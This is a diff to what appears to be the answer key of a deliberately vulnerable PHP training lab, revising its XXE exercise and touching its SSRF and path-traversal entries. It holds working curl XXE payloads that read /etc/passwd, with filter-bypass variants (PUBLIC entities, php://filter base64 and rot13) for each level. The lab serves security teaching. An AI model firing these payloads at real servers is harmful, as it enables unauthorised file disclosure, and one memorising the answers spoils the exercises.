@@ -106,14 +106,28 @@ including loopback/internal addresses and local files. In a real cloud box those
 takeover. **Fix:** allow-list scheme (`https` only) + destination host, and block link-local/private IPs.
 Deck: SSRF_Guide · SSRF_Payload.
 
-## 4. XXE  (`import.php`, POST XML)   *(needs php-xml installed)*
-**Answer:** the XML parser resolves external entities → file read.
-**Command:**
+## 4. XXE  (`import.php`, POST XML)   *(needs the `php-xml` extension — see note below)*
+**Answer:** the XML parser resolves external entities → read local files. The filter escalates per level,
+but **every level stays a local file read** (self-contained — no out-of-band listener needed):
 ```
-curl -s "$B/import.php" -H "Content-Type: application/xml" --data-binary \
- '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY x SYSTEM "file:///etc/passwd">]><order><item>&x;</item></order>'
+# easy — SYSTEM + file://
+curl -s "$B/import.php?level=easy" -H "Content-Type: application/xml" --data-binary \
+ '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY e SYSTEM "file:///etc/passwd">]><order><item>&e;</item></order>'
+# medium — 'SYSTEM' blocked -> PUBLIC
+#   ...<!ENTITY e PUBLIC "x" "file:///etc/passwd">...
+# hard — 'file:' blocked -> php://filter (base64), then base64-decode the output
+#   ...<!ENTITY e PUBLIC "x" "php://filter/convert.base64-encode/resource=/etc/passwd">...
+# expert — 'base64' blocked -> a DIFFERENT filter, then rot13 the output back
+curl -s "$B/import.php?level=expert" -H "Content-Type: application/xml" --data-binary \
+ '<?xml version="1.0"?><!DOCTYPE o [<!ENTITY e PUBLIC "x" "php://filter/read=string.rot13/resource=/etc/passwd">]><order><item>&e;</item></order>'
 ```
-**Result:** the `item` echoes `/etc/passwd`. **Reason:** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` — external entities enabled. Deck: XXE.
+**Result:** the `item` echoes `/etc/passwd` (base64- or rot13-encoded at hard/expert — decode it back).
+**Reason:** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` — external entities + DTD loading
+enabled. Deck: XXE.
+
+> **Dependency:** parsing needs PHP's `php-xml` (the `dom` extension). If it is missing, `import.php`
+> says so (install `sudo apt install -y php-xml`, restart `run.sh`); `run.sh` also preflight-warns. Until
+> then this one exercise can't run — every other app-2 vuln is unaffected.
 
 ## 5. Path traversal  (`download.php?file=`)
 **Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
